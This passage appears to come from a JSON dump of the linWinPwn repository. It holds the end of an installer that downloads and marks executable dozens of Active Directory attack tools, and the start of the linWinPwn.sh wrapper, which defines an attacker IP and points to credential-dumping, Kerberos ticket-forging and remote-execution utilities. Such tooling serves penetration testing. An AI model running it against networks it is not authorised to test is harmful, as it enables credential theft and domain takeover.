\"https://raw.githubusercontent.com/layer8secure/SilentHound/main/silenthound.py\" -O \"$scripts_dir/silenthound.py\"\n    wget -q \"https://raw.githubusercontent.com/ShutdownRepo/targetedKerberoast/main/targetedKerberoast.py\" -O \"$scripts_dir/targetedKerberoast.py\"\n    wget -q \"https://raw.githubusercontent.com/p0dalirius/FindUncommonShares/main/FindUncommonShares.py\" -O \"$scripts_dir/FindUncommonShares.py\"\n    wget -q \"https://raw.githubusercontent.com/p0dalirius/ExtractBitlockerKeys/refs/heads/main/python/ExtractBitlockerKeys.py\" -O \"$scripts_dir/ExtractBitlockerKeys.py\"\n    wget -q \"https://raw.githubusercontent.com/p0dalirius/ldapconsole/master/ldapconsole.py\" -O \"$scripts_dir/ldapconsole.py\"\n    wget -q \"https://raw.githubusercontent.com/p0dalirius/LDAPmonitor/master/python/pyLDAPmonitor.py\" -O \"$scripts_dir/pyLDAPmonitor.py\"\n    wget -q \"https://raw.githubusercontent.com/p0dalirius/LDAPWordlistHarvester/main/LDAPWordlistHarvester.py\" -O \"$scripts_dir/LDAPWordlistHarvester.py\"\n    wget -q \"https://github.com/garrettfoster13/aced/archive/refs/heads/main.zip\" -O \"$scripts_dir/aced.zip\"\n    wget -q \"https://github.com/garrettfoster13/sccmhunter/archive/refs/heads/main.zip\" -O \"$scripts_dir/sccmhunter.zip\"\n    wget -q \"https://raw.githubusercontent.com/shellster/LDAPPER/master/ldapper.py\" -O \"$scripts_dir/ldapper/ldapper.py\"\n    wget -q \"https://raw.githubusercontent.com/shellster/LDAPPER/master/utilities.py\" -O \"$scripts_dir/ldapper/utilities.py\"\n    wget -q \"https://raw.githubusercontent.com/shellster/LDAPPER/master/queries.py\" -O \"$scripts_dir/ldapper/queries.py\"\n    wget -q \"https://raw.githubusercontent.com/shellster/LDAPPER/master/ldap_connector.py\" -O \"$scripts_dir/ldapper/ldap_connector.py\"\n    wget -q \"https://github.com/trustedsec/orpheus/archive/refs/heads/main.zip\" -O \"$scripts_dir/orpheus.zip\"\n    wget -q \"https://github.com/lkarlslund/Adalanche/releases/latest/download/adalanche-linux-x64-v2024.1.11\" -O \"$scripts_dir/adalanche\"\n    wget -q \"https://github.com/Hackndo/pyGPOAbuse/archive/refs/heads/master.zip\" -O \"$scripts_dir/pyGPOAbuse.zip\"\n    wget -q \"https://raw.githubusercontent.com/X-C3LL/GPOwned/main/GPOwned.py\" -O \"$scripts_dir/GPOwned.py\"\n    wget -q \"https://raw.githubusercontent.com/dirkjanm/PrivExchange/master/privexchange.py\" -O \"$scripts_dir/privexchange.py\"\n    wget -q \"https://raw.githubusercontent.com/lgandx/Responder/master/tools/RunFinger.py\" -O \"$scripts_dir/Responder/RunFinger.py\"\n    wget -q \"https://raw.githubusercontent.com/lgandx/Responder/master/tools/odict.py\" -O \"$scripts_dir/Responder/odict.py\"\n    wget -q \"https://raw.githubusercontent.com/lgandx/Responder/master/tools/RunFingerPackets.py\" -O \"$scripts_dir/Responder/RunFingerPackets.py\"\n    wget -q \"https://github.com/lkarlslund/ldapnomnom/releases/latest/download/ldapnomnom-linux-x64\" -O \"$scripts_dir/ldapnomnom\"\n    wget -q \"https://github.com/Macmod/godap/releases/download/v2.8.0/godap-v2.8.0-linux-amd64.tar.gz\" -O \"$scripts_dir/godap-v2.8.0-linux-amd64.tar.gz\"\n    wget -q \"https://raw.githubusercontent.com/Tw1sm/aesKrbKeyGen/refs/heads/master/aesKrbKeyGen.py\" -O \"$scripts_dir/aesKrbKeyGen.py\"\n    wget -q \"https://github.com/barcrange/CVE-2024-49113-Checker/blob/main/CVE-2024-49113-checker.py\" -O \"$scripts_dir/CVE-2024-49113-checker.py\"\n\n    unzip -o \"$scripts_dir/aced.zip\" -d \"$scripts_dir\"\n    unzip -o \"$scripts_dir/sccmhunter.zip\" -d \"$scripts_dir\"\n    unzip -o \"$scripts_dir/orpheus.zip\" -d \"$scripts_dir\"\n    unzip -o \"$scripts_dir/pyGPOAbuse.zip\" -d \"$scripts_dir\"\n    tar -C $scripts_dir -xf \"$scripts_dir/godap-v2.8.0-linux-amd64.tar.gz\" godap\n\n    chmod +x \"$scripts_dir/aced-main/aced.py\"\n    chmod +x \"$scripts_dir/sccmhunter-main/sccmhunter.py\"\n    chmod +x \"$scripts_dir/windapsearch\"\n    chmod +x \"$scripts_dir/kerbrute\"\n    chmod +x \"$scripts_dir/enum4linux-ng.py\"\n    chmod +x \"$scripts_dir/CVE-2022-33679.py\"\n    chmod +x \"$scripts_dir/silenthound.py\"\n    chmod +x \"$scripts_dir/targetedKerberoast.py\"\n    chmod +x \"$scripts_dir/FindUncommonShares.py\"\n    chmod +x \"$scripts_dir/ExtractBitlockerKeys.py\"\n    chmod +x \"$scripts_dir/ldapconsole.py\"\n    chmod +x \"$scripts_dir/pyLDAPmonitor.py\"\n    chmod +x \"$scripts_dir/LDAPWordlistHarvester.py\"\n    chmod +x \"$scripts_dir/ldapper/ldapper.py\"\n    chmod +x \"$scripts_dir/orpheus-main/orpheus.py\"\n    chmod +x \"$scripts_dir/orpheus-main/GetUserSPNs.py\"\n    chmod +x \"$scripts_dir/adalanche\"\n    chmod +x \"$scripts_dir/pyGPOAbuse-master/pygpoabuse.py\"\n    chmod +x \"$scripts_dir/GPOwned.py\"\n    chmod +x \"$scripts_dir/privexchange.py\"\n    chmod +x \"$scripts_dir/Responder/RunFinger.py\"\n    chmod +x \"$scripts_dir/Responder/odict.py\"\n    chmod +x \"$scripts_dir/Responder/RunFingerPackets.py\"\n    chmod +x \"$scripts_dir/ldapnomnom\"\n    chmod +x \"$scripts_dir/godap\"\n    chmod +x \"$scripts_dir/aesKrbKeyGen.py\"\n    chmod +x \"$scripts_dir/CVE-2024-49113-checker.py\"\n}\n\ninstall_tools || { echo -e \"\\n${RED}[Failure]${NC} Installing tools failed.. exiting script!\\n\"; exit 1; }\n\necho -e \"\\n${GREEN}[Success]${NC} Setup completed successfully! Open a new terminal to load the shell's configuration ... \\n\"\n"
        },
        {
          "name": "linWinPwn.sh",
          "type": "blob",
          "size": 298.46875,
          "content": "#!/bin/bash\n# Title: linWinPwn\n# Author: lefayjey\n\n#Colors\nRED='\\033[1;31m'\nGREEN='\\033[1;32m'\nCYAN='\\033[1;36m'\nBLUE='\\033[1;34m'\nYELLOW='\\033[1;33m'\nPURPLE='\\033[1;35m'\nNC='\\033[0m'\n\n#Default variables\nuser=\"\"\npassword=\"\"\ninteractive_bool=true\noutput_dir=\"$(pwd)\"\nwordlists_dir=\"/opt/lwp-wordlists\"\npass_wordlist=\"/usr/share/wordlists/rockyou.txt\"\nif [ ! -f \"${pass_wordlist}\" ]; then pass_wordlist=\"${wordlists_dir}/rockyou.txt\"; fi\nuser_wordlist=\"/usr/share/seclists/Usernames/cirt-default-usernames.txt\"\nif [ ! -f \"${user_wordlist}\" ]; then user_wordlist=\"${wordlists_dir}/cirt-default-usernames.txt\"; fi\nattacker_interface=\"eth0\"\nattacker_IP=$(ip -f inet addr show $attacker_interface | sed -En -e 's/.*inet ([0-9.]+).*/\\1/p')\ncurr_targets=\"Domain Controllers\"\ntargets=\"DC\"\ncustom_target_scanned=false\nnullsess_bool=false\npass_bool=false\nhash_bool=false\nkerb_bool=false\naeskey_bool=false\ncert_bool=false\nautoconfig_bool=false\nldaps_bool=false\nldapbinding_bool=false\nforcekerb_bool=false\nverbose_bool=false\n\n#Tools variables\nscripts_dir=\"/opt/lwp-scripts\"\nnetexec=$(which netexec)\nimpacket_findDelegation=$(which findDelegation.py)\nif [ ! -f \"${impacket_findDelegation}\" ]; then impacket_findDelegation=$(which impacket-findDelegation); fi\nimpacket_GetUserSPNs=$(which GetUserSPNs.py)\nif [ ! -f \"${impacket_GetUserSPNs}\" ]; then impacket_GetUserSPNs=$(which impacket-GetUserSPNs); fi\nimpacket_secretsdump=$(which secretsdump.py)\nif [ ! -f \"${impacket_secretsdump}\" ]; then impacket_secretsdump=$(which impacket-secretsdump); fi\nimpacket_GetNPUsers=$(which GetNPUsers.py)\nif [ ! -f \"${impacket_GetNPUsers}\" ]; then impacket_GetNPUsers=$(which impacket-GetNPUsers); fi\nimpacket_getTGT=$(which getTGT.py)\nif [ ! -f \"${impacket_getTGT}\" ]; then impacket_getTGT=$(which impacket-getTGT); fi\nimpacket_goldenPac=$(which goldenPac.py)\nif [ ! -f \"${impacket_goldenPac}\" ]; then impacket_goldenPac=$(which impacket-goldenPac); fi\nimpacket_rpcdump=$(which rpcdump.py)\nif [ ! -f \"${impacket_rpcdump}\" ]; then impacket_rpcdump=$(which impacket-rpcdump); fi\nimpacket_reg=$(which reg.py)\nif [ ! -f \"${impacket_reg}\" ]; then impacket_reg=$(which impacket-reg); fi\nimpacket_smbserver=$(which smbserver.py)\nif [ ! -f \"${impacket_smbserver}\" ]; then impacket_smbserver=$(which impacket-smbserver); fi\nimpacket_ticketer=$(which ticketer.py)\nif [ ! -f \"${impacket_ticketer}\" ]; then impacket_ticketer=$(which impacket-ticketer); fi\nimpacket_ticketconverter=$(which ticketConverter.py)\nif [ ! -f \"${impacket_ticketconverter}\" ]; then impacket_ticketconverter=$(which impacket-ticketconverter); fi\nimpacket_getST=$(which getST.py)\nif [ ! -f \"${impacket_getST}\" ]; then impacket_getST=$(which impacket-getST); fi\nimpacket_raiseChild=$(which raiseChild.py)\nif [ ! -f \"${impacket_raiseChild}\" ]; then impacket_raiseChild=$(which impacket-raiseChild); fi\nimpacket_smbclient=$(which smbclient.py)\nif [ ! -f \"${impacket_smbclient}\" ]; then impacket_smbclient=$(which impacket-smbexec); fi\nimpacket_smbexec=$(which smbexec.py)\nif [ ! -f \"${impacket_smbexec}\" ]; then impacket_smbexec=$(which impacket-smbexec); fi\nimpacket_wmiexec=$(which wmiexec.py)\nif [ ! -f \"${impacket_wmiexec}\" ]; then impacket_wmiexec=$(which impacket-wmiexec); fi\nimpacket_psexec=$(which psexec.py)\nif [ ! -f \"${impacket_psexec}\" ]; then impacket_psexec=$(which impacket-psexec); fi\nimpacket_changepasswd=$(which changepasswd.py)\nif [ ! -f \"${impacket_changepasswd}\" ]; then impacket_changepasswd=$(which impacket-changepasswd); fi\nimpacket_mssqlclient=$(which mssqlclient.py)\nif [ ! -f \"${impacket_mssqlclient}\" ]; then impacket_mssqlclient=$(which impacket-mssqlclient); fi\nimpacket_describeticket=$(which describeTicket.py)\nif [ ! -f \"${impacket_describeticket}\" ]; then impacket_describeticket=$(which impacket-describeTicket); fi\nenum4linux_py=$(which enum4linux-ng)\nif [ ! -f \"${enum4linux_py}\" ]; then enum4linux_py=\"$scripts_dir/enum4linux-ng.py\"; fi\nbloodhound=$(which bloodhound-python)\nbloodhoundce=$(which bloodhound-python_ce)\nldapdomaindump=$(which ldapdomaindump)\nsmbmap=$(which smbmap)\nadidnsdump=$(which adidnsdump)\ncerti_py=$(which certi.py)\ncertipy=$(which certipy)\nldeep=$(which ldeep)\npre2k=$(which pre2k)\ncertsync=$(which certsync)\nhekatomb=$(which hekatomb)\nmanspider=$(which manspider)\ncoercer=$(which coercer)\ndonpapi=$(which DonPAPI)\nbloodyad=$(which bloodyAD)\nmssqlrelay=$(which mssqlrelay)\nkerbrute=\"$scripts_dir/kerbrute\"\nsilenthound=\"$scripts_dir/silenthound.py\"\nwindapsearch=\"$scripts_dir/windapsearch\"\nCVE202233679=\"$scripts_dir/CVE-2022-33679.py\"\ntargetedKerberoast=\"$scripts_dir/targetedKerberoast.py\"\nFindUncommonShares=\"$scripts_dir/FindUncommonShares.py\"\nExtractBitlockerKeys=\"$scripts_dir/ExtractBitlockerKeys.py\"\nldapconsole=\"$scripts_dir/ldapconsole.py\"\npyLDAPmonitor=\"$scripts_dir/pyLDAPmonitor.py\"\nLDAPWordlistHarvester=\"$scripts_dir/LDAPWordlistHarvester.py\"\nrdwatool=$(which rdwatool)\naced=\"$scripts_dir/aced-main/aced.py\"\nsccmhunter=\"$scripts_dir/sccmhunter-main/sccmhunter.py\"\nldapper=\"$scripts_dir/ldapper/ldapper.py\"\norpheus=\"$scripts_dir/orpheus-main/orpheus.py\"\nkrbjack=$(which krbjack)\nadalanche=\"$scripts_dir/adalanche\"\npygpoabuse=\"$scripts_dir/pyGPOAbuse-master/pygpoabuse.py\"\nGPOwned=\"$scripts_dir/GPOwned.py\"\nprivexchange=\"$scripts_dir/privexchange.py\"\nRunFinger=\"$scripts_dir/Responder/RunFinger.py\"\nLDAPNightmare=\"$scripts_dir/CVE-2024-49113-checker.py\"\nADCheck=$(which adcheck)\nadPEAS=$(which adPEAS)\nbreads=$(which breads-ad)\nsmbclientng=$(which smbclientng)\nevilwinrm=$(which evil-winrm)\nldapnomnom=\"$scripts_dir/ldapnomnom\"\ngodap=\"$scripts_dir/godap\"\nmssqlpwner=$(which mssqlpwner)\naesKrbKeyGen=\"$scripts_dir/aesKrbKeyGen.py\"\nnmap=$(which nmap)\njohn=$(which john)\npython3=\"${scripts_dir}/.venv/bin/python3\"\nif [ ! -f \"${python3}\" ]; then python3=$(which python3); fi\n\nprint_banner() {\n    echo -e \"\n       _        __        ___       ____                  \n      | |(_)_ __\\ \\      / (_)_ __ |  _ \\__      ___ __   \n      | || | '_  \\ \\ /\\ / /| | '_ \\| |_) \\ \\ /\\ / | '_ \\  \n      | || | | | |\\ V  V / | | | | |  __/ \\ V  V /| | | | \n      |_||_|_| |_| \\_/\\_/  |_|_| |_|_|     \\_/\\_/ |_| |_| \n\n      ${BLUE}linWinPwn: ${CYAN}version 1.0.30 ${NC}\n      https://github.com/lefayjey/linWinPwn\n      ${BLUE}Author: ${CYAN}lefayjey${NC}\n      ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}\n\"\n}\n\nhelp_linWinPwn() {\n    print_banner\n    echo -e \"${YELLOW}Parameters${NC}\"\n    echo -e \"-h/--help           Show the help message\"\n    echo -e \"-t/--target         IP Address of Target Domain Controller ${RED}[MANDATORY]${NC}\"\n    echo -e \"-d/--domain         Domain of user (default: empty)\"\n    echo -e \"-u/--username       Username (default: empty)\"\n    echo -e \"-p                  Password (NTLM authentication only) (default: empty)\"\n    echo -e \"-H                  LM:NT (NTLM authentication only) (default: empty)\"\n    echo -e \"-K                  Location to Kerberos ticket './krb5cc_ticket' (Kerberos authentication only) (default: empty)\"\n    echo -e \"-A                  AES Key (Kerberos authentication only) (default: empty)\"\n    echo -e \"-C                  Location to PFX Certificate './cert.pfx' (default: empty)\"\n    echo -e \"--cert-pass         Password of provided PFX Certificate (optional)\"\n    echo -e \"--auto              Run automatic enumeration\"\n    echo -e \"-o/--output         Output directory (default: current dir)\"\n    echo -e \"--auto-config       Run NTP sync with target DC and adds entry to /etc/hosts\"\n    echo -e \"--ldaps             Use LDAPS instead of LDAP (port 636)\"\n    echo -e \"--ldap-binding      Use LDAP Channel Binding on LDAPS (port 636)\"\n    echo -e \"--force-kerb        Use Kerberos authentication instead of NTLM when possible (requires password or NTLM hash)\"\n    echo -e \"--verbose           Enable all verbose and debug outputs\"\n    echo -e \"-I/--interface      Attacker's network interface (default: eth0)\"\n    echo -e \"-T/--targets        Target systems for Vuln Scan, SMB Scan and Pwd Dump (default: Domain Controllers)\"\n    echo -e \"-U/--userwordlist   Custom username list used during Null session checks\"\n    echo -e \"-P/--passwordlist   Custom password list used during password cracking\"\n    echo -e \"     ${CYAN}Choose between:${NC} DC (Domain Controllers), All (All domain servers), File='path_to_file' (File containing list of servers), IP='IP_or_hostname' (IP or hostname)\"\n    echo -e \"\"\n    echo -e \"${YELLOW}Example usages${NC}\"\n    echo -e \"$(pwd)/$(basename \"$0\") -t dc_ip ${CYAN}(No password for anonymous login)${NC}\" >&2\n    echo -e \"$(pwd)/$(basename \"$0\") -t dc_ip -d domain -u user [-p password or -H hash or -K kerbticket]\" >&2\n    echo -e \"\"\n}\n\nargs=()\nwhile test $# -gt 0; do\n    case $1 in\n    -t | --target)\n        dc_ip=\"${2}\"\n        shift\n        ;; #mandatory\n    -d | --domain)\n        domain=\"${2}\"\n        shift\n        ;;\n    -u | --user)\n        user=\"${2}\"\n        shift\n        ;; #leave empty for anonymous login\n    -p)\n        password=\"${2}\"\n        if [ ! \"${password}\" == \"\" ]; then pass_bool=true; fi\n        shift\n        ;; #password\n    -H)\n        hash=\"${2}\"\n        if [ ! \"${hash}\" == \"\" ]; then hash_bool=true; fi\n        shift\n        ;; #NTLM hash\n    -K)\n        krb5cc=\"${2}\"\n        if [ ! \"${krb5cc}\" == \"\" ]; then kerb_bool=true; fi\n        shift\n        ;; #location of krb5cc ticket\n    -A)\n        aeskey=\"${2}\"\n        if [ ! \"${aeskey}\" == \"\" ]; then aeskey_bool=true; fi\n        shift\n        ;; #AES Key (128 or 256 bits)\n    -C)\n        pfxcert=\"${2}\"\n        if [ ! \"${pfxcert}\" == \"\" ]; then cert_bool=true; fi\n        shift\n        ;; #location of PFX certificate\n    --cert-pass)\n        pfxpass=\"${2}\"\n        shift\n        ;; #Password of PFX certificate\n    -o)\n        output_dir=\"$(realpath \"${2}\")\"\n        shift\n        ;;\n    --output)\n        output_dir=\"$(realpath \"${2}\")\"\n        shift\n        ;;\n    -I | --interface)\n        attacker_IP=\"$(ip -f inet addr show \"${2}\" | sed -En 's/.*inet ([0-9.]+).*/\\1/p')\"\n        attacker_interface=\"${2}\"\n        shift\n        ;;\n    -T | --targets)\n        targets=\"${2}\"\n        shift\n        ;;\n    -U | --userwordlist)\n        user_wordlist=\"${2}\"\n        shift\n        ;;\n    -P | --passwordlist)\n        pass_wordlist=\"${2}\"\n        shift\n        ;;\n    --auto)\n        interactive_bool=false\n        args+=(\"$1\")\n        ;; #auto mode, disable interactive\n    --auto-config)\n        autoconfig_bool=true\n        args+=(\"$1\")\n        ;;\n    --ldaps)\n        ldaps_bool=true\n        args+=(\"$1\")\n        ;;\n    --ldap-binding)\n        ldaps_bool=true\n        ldapbinding_bool=true\n        args+=(\"$1\")\n        ;;\n    --force-kerb)\n        forcekerb_bool=true\n        args+=(\"$1\")\n        ;;\n    --verbose)\n        verbose_bool=true\n        args+=(\"$1\")\n        ;;\n    -h | --help)\n        help_linWinPwn\n        exit\n        ;;\n    *)\n        print_banner\n        echo -e \"${RED}[-] Unknown option:${NC} ${1}\"\n        echo -e \"Use -h for help\"\n        exit 1\n        ;;\n    esac\n    shift\ndone\nset -- \"${args[@]}\"\n\nrun_command() {\n    echo \"$(date +%Y-%m-%d\\ %H:%M:%S); $*\" >>\"$command_log\"\n    /usr/bin/script -qc \"$@\" /dev/null\n}\n\nntp_update() {\n    echo -e \"\"\n    sudo timedatectl set-ntp 0\n    sudo ntpdate \"${dc_ip}\"\n    echo -e \"${GREEN}[+] NTP sync complete${NC}\"\n}\n\netc_hosts_update() {\n    echo -e \"\"\n    if ! grep -q \"${dc_ip}\" \"/etc/hosts\" >/dev/null 2>&1; then\n        hosts_bak=\"${output_dir}/Config/hosts.$(date +%Y%m%d%H%M%S).backup\"\n        sudo cp /etc/hosts \"${hosts_bak}\"\n        echo -e \"${YELLOW}[i] Backup file of /etc/hosts created: ${hosts_bak}${NC}\"\n        sudo sed -i \"/${dc_FQDN}/d\" /etc/hosts\n        echo -e \"# /etc/hosts entry added by linWinPwn\" | sudo tee -a /etc/hosts\n        echo -e \"${dc_ip}\\t${dc_domain} ${dc_FQDN} ${dc_NETBIOS}\" | sudo tee -a /etc/hosts\n        echo -e \"${GREEN}[+] Hosts file update complete${NC}\"\n    else\n        echo -e \"${PURPLE}[-] Target IP already present in /etc/hosts... ${NC}\"\n    fi\n}\n\netc_resolv_update() {\n    echo -e \"\"\n    if ! grep -q \"${dc_ip}\" \"/etc/resolv.conf\" >/dev/null 2>&1; then\n        resolv_bak=\"${output_dir}/Config/resolv.conf.$(date +%Y%m%d%H%M%S).backup\"\n        sudo cp /etc/resolv.conf \"${resolv_bak}\"\n        echo -e \"${YELLOW}[i] Backup file of /etc/resolv.conf created: ${resolv_bak}${NC}\"\n        sed \"1s/^/\\# \\/etc\\/resolv.conf entry added by linWinPwn\\nnameserver ${dc_ip}\\n/\" /etc/resolv.conf | sudo tee /etc/resolv.conf\n        echo -e \"${GREEN}[+] DNS resolv config update complete${NC}\"\n    else\n        echo -e \"${PURPLE}[-] Target IP already present in /etc/resolv.conf... ${NC}\"\n    fi\n}\n\netc_krb5conf_update() {\n    echo -e \"\"\n    if ! grep -q \"${dc_domain}\" \"/etc/krb5.conf\" >/dev/null 2>&1; then\n        krb5_bak=\"${output_dir}/Config/krb5.conf.$(date +%Y%m%d%H%M%S)\".backup\n        sudo cp /etc/krb5.conf \"${krb5_bak}\"\n        echo -e \"${YELLOW}[i] Backup file of /etc/krb5.conf created: ${krb5_bak}${NC}\"\n        echo -e \"# /etc/krb5.conf file modified by linWinPwn\" | sudo tee /etc/krb5.conf\n        echo -e \"[libdefaults]\" | sudo tee -a /etc/krb5.conf\n        echo -e \"        default_realm = ${domain^^}\" | sudo tee -a /etc/krb5.conf\n        echo -e \"\" | sudo tee -a /etc/krb5.conf\n        echo -e \"# The following krb5.conf variables are only for MIT Kerberos.\" | sudo tee -a /etc/krb5.conf\n        echo -e \"        kdc_timesync = 1\" | sudo tee -a /etc/krb5.conf\n        echo -e \"        ccache_type = 4\" | sudo tee -a /etc/krb5.conf\n        echo -e \"        forwardable = true\" | sudo tee -a /etc/krb5.conf\n        echo -e \"        proxiable = true\" | sudo tee -a /etc/krb5.conf\n        echo -e \"        rdns = false\" | sudo tee -a /etc/krb5.conf\n        echo -e \"\" | sudo tee -a /etc/krb5.conf\n        echo -e \"        fcc-mit-ticketflags = true\" | sudo tee -a /etc/krb5.conf\n        echo -e \"        dns_canonicalize_hostname = false\" | sudo tee -a /etc/krb5.conf\n        echo -e \"        dns_lookup_realm = false\" | sudo tee -a /etc/krb5.conf\n        echo -e \"        dns_lookup_kdc = true\" | sudo tee -a /etc/krb5.conf\n        echo -e \"        k5login_authoritative = false\" | sudo tee -a /etc/krb5.conf\n        echo -e \"\" | sudo tee -a /etc/krb5.conf\n        echo -e \"[realms]\" | sudo tee -a /etc/krb5.conf\n        echo -e \"        ${domain^^} = {\" | sudo tee -a /etc/krb5.conf\n        echo -e \"                kdc = ${dc_FQDN}\" | sudo tee -a /etc/krb5.conf\n        echo -e \"        }\" | sudo tee -a /etc/krb5.conf\n        echo -e \"\" | sudo tee -a /etc/krb5.conf\n        echo -e \"[domain_realm]\" | sudo tee -a /etc/krb5.conf\n        echo -e \"        .${domain,,} = ${domain^^}\" | sudo tee -a /etc/krb5.conf\n        echo -e \"${GREEN}[+] KRB5 config update complete${NC}\"\n    else\n        echo -e \"${PURPLE}[-] Domain already present in /etc/krb5.conf... ${NC}\"\n    fi\n}\n\nprepare() {\n    if [ -z \"$dc_ip\" ]; then\n        echo -e \"${RED}[-] Missing target... ${NC}\"\n        if [ -n \"$domain\" ]; then\n            dig_ip=$(dig +short \"${domain}\")\n            if [ -n \"$dig_ip\" ]; then echo -e \"${YELLOW}[i]${NC} Provided domain resolves to ${dig_ip}! Try again with ${YELLOW}-t $dig_ip${NC}\"; fi\n        fi\n        echo -e \"${YELLOW}[i]${NC} Use -h for more help\"\n        exit 1\n    elif [[ ! $dc_ip =~ ^[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+$ ]]; then\n        echo -e \"${RED}[-] Target is not an IP address... ${NC}\"\n        dig_ip=$(dig +short \"${dc_ip}\")\n        if [ -n \"$dig_ip\" ]; then echo -e \"${YELLOW}[i]${NC} Provided target resolves to ${dig_ip}! Try again with ${YELLOW}-t $dig_ip${NC}\"; fi\n\n        if [ -n \"$domain\" ]; then\n            dig_ip=$(dig +short \"${domain}\")\n            if [ -n \"$dig_ip\" ]; then echo -e \"${YELLOW}[i]${NC} Provided domain resolves to ${dig_ip}! Try again with ${YELLOW}-t $dig_ip${NC}\"; fi\n        fi\n        echo -e \"${YELLOW}[i]${NC} Use -h for more help\"\n        exit 1\n    fi\n\n    echo -e \"${GREEN}[+] $(date)${NC}\"\n\n    if [ ! -f \"${netexec}\" ]; then\n        echo -e \"${RED}[-] Please ensure netexec is installed and try again... ${NC}\"\n        exit 1\n    else\n        dc_info=$(${netexec} ldap \"${dc_ip}\" | grep -v \"Connection refused\")\n    fi\n\n    dc_NETBIOS=$(echo \"$dc_info\" | cut -d \":\" -f 2 | sed \"s/) (domain//g\" | head -n 1)\n    dc_domain=$(echo \"$dc_info\" | cut -d \":\" -f 3 | sed \"s/) (signing//g\" | head -n 1)\n    if [[ \"${dc_NETBIOS}\" == *\"${dc_domain}\"* ]]; then\n        dc_FQDN=${dc_NETBIOS}\n        dc_NETBIOS=$(echo \"${dc_FQDN}\" | cut -d \".\" -f 1)\n    else\n        dc_FQDN=${dc_NETBIOS}\".\"${dc_domain}\n    fi\n\n    if [ -z \"$dc_info\" ]; then\n        echo -e \"${RED}[-] Error connecting to target! Please ensure the target is a Domain Controller and try again... ${NC}\"\n        exit 1\n    elif [ -z \"$dc_domain\" ]; then\n        echo -e \"${RED}[-] Error finding DC's domain, please specify domain... ${NC}\"\n        exit 1\n    else\n        if [ -z \"$domain\" ]; then domain=$dc_domain; fi\n    fi\n\n    if [ \"${user}\" == \"\" ]; then user_out=\"null\"; else user_out=${user// /}; fi\n    output_dir=\"${output_dir}/linWinPwn_${dc_domain}_${user_out}\"\n    command_log=\"$output_dir/$(date +%Y-%m-%d)_command.log\"\n    servers_ip_list=\"${output_dir}/DomainRecon/Servers/ip_list_${dc_domain}.txt\"\n    dc_ip_list=\"${output_dir}/DomainRecon/Servers/dc_ip_list_${dc_domain}.txt\"\n    sql_ip_list=\"${output_dir}/DomainRecon/Servers/sql_ip_list_${dc_domain}.txt\"\n    servers_hostname_list=\"${output_dir}/DomainRecon/Servers/servers_list_${dc_domain}.txt\"\n    dc_hostname_list=\"${output_dir}/DomainRecon/Servers/dc_list_${dc_domain}.txt\"\n    sql_hostname_list=\"${output_dir}/DomainRecon/Servers/sql_list_${dc_domain}.txt\"\n    custom_servers_list=\"${output_dir}/DomainRecon/Servers/custom_servers_list_${dc_domain}.txt\"\n    target=${dc_ip}\n    target_servers=${servers_ip_list}\n    target_dc=${dc_ip_list}\n    target_sql=${sql_ip_list}\n\n    mkdir -p \"${output_dir}/Credentials\"\n    mkdir -p \"${output_dir}/DomainRecon/Servers\"\n    mkdir -p \"${output_dir}/DomainRecon/Users\"\n    mkdir -p \"${output_dir}/Scans\"\n\n    dc_open_ports=$(${nmap} -n -Pn -p 135,445,389,636,88,3389,5985 \"${dc_ip}\" -sT -T5 --open -oG \"${output_dir}/Scans/${dc_ip}\"_mainports)\n    if [[ $dc_open_ports == *\"135/tcp\"* ]]; then dc_port_135=\"${GREEN}open${NC}\"; else dc_port_135=\"${RED}filtered|closed${NC}\"; fi\n    if [[ $dc_open_ports == *\"445/tcp\"* ]]; then dc_port_445=\"${GREEN}open${NC}\"; else dc_port_445=\"${RED}filtered|closed${NC}\"; fi\n    if [[ $dc_open_ports == *\"389/tcp\"* ]]; then dc_port_389=\"${GREEN}open${NC}\"; else dc_port_389=\"${RED}filtered|closed${NC}\"; fi\n    if [[ $dc_open_ports == *\"636/tcp\"* ]]; then dc_port_636=\"${GREEN}open${NC}\"; else dc_port_636=\"${RED}filtered|closed${NC}\"; fi\n    if [[ $dc_open_ports == *\"88/tcp\"* ]]; then dc_port_88=\"${GREEN}open${NC}\"; else dc_port_88=\"${RED}filtered|closed${NC}\"; fi\n    if [[ $dc_open_ports == *\"3389/tcp\"* ]]; then dc_port_3389=\"${GREEN}open${NC}\"; else dc_port_3389=\"${RED}filtered|closed${NC}\"; fi\n    if [[ $dc_open_ports == *\"5985/tcp\"* ]]; then dc_port_5985=\"${GREEN}open${NC}\"; else dc_port_5985=\"${RED}filtered|closed${NC}\"; fi\n\n    if [ \"${autoconfig_bool}\" == true ]; then\n        echo -e \"${BLUE}[*] Running auto-config... ${NC}\"\n        mkdir -p \"${output_dir}/Config\"\n        ntp_update\n        etc_hosts_update\n        etc_resolv_update\n        etc_krb5conf_update\n    fi\n\n    if [ ! -f \"${servers_ip_list}\" ]; then /bin/touch \"${servers_ip_list}\"; fi\n    if [ ! -f \"${servers_hostname_list}\" ]; then /bin/touch \"${servers_hostname_list}\"; fi\n    if [ ! -f \"${dc_ip_list}\" ]; then /bin/touch \"${dc_ip_list}\"; fi\n    if [ ! -f \"${dc_hostname_list}\" ]; then /bin/touch \"${dc_hostname_list}\"; fi\n\n    if [ ! -f \"${user_wordlist}\" ]; then\n        echo -e \"${RED}[-] Users list file not found${NC}\"\n    fi\n\n    if [ ! -f \"${pass_wordlist}\" ]; then\n        echo -e \"${RED}[-] Passwords list file not found${NC}\"\n    fi\n\n    echo -e \"\"\n\n    if [[ $targets == \"DC\" ]]; then\n        curr_targets=\"Domain Controllers\"\n    elif [[ $targets == \"All\" ]]; then\n        dns_enum\n        curr_targets=\"All domain servers\"\n    elif [[ $targets == \"File=\"* ]]; then\n        curr_targets=\"File containing list of servers\"\n        /bin/rm \"${custom_servers_list}\" 2>/dev/null\n        custom_servers=$(echo \"$targets\" | cut -d \"=\" -f 2)\n        /bin/cp \"${custom_servers}\" \"${custom_servers_list}\" 2>/dev/null\n        if [ ! -s \"${custom_servers_list}\" ]; then\n            echo -e \"${RED}Invalid servers list.${NC} Choosing Domain Controllers as targets instead.\"\n            curr_targets=\"Domain Controllers\"\n            custom_servers=\"\"\n        fi\n    elif [[ $targets == \"IP=\"* ]]; then\n        curr_targets=\"IP or hostname\"\n        custom_ip=$(echo \"$targets\" | cut -d \"=\" -f 2)\n        /bin/rm \"${custom_servers_list}\" 2>/dev/null\n        echo -n \"$custom_ip\" >\"${custom_servers_list}\" 2>/dev/null\n        if [ ! -s \"${custom_servers_list}\" 